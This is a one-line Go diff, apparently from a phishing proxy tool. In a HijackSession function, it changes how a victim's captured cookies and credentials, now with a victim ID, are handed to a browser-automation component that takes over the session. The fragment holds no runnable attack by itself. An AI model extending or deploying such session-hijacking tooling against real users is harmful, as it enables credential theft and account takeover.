@@ -510,7 +510,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	} else {
 		nb, ok := m.(*necrobrowser.Necrobrowser)
 		if ok {
-			go nb.Instrument(victim.Cookies, string(creds))
+			go nb.Instrument(victim.ID, victim.Cookies, string(creds))
 		}
 	}
 
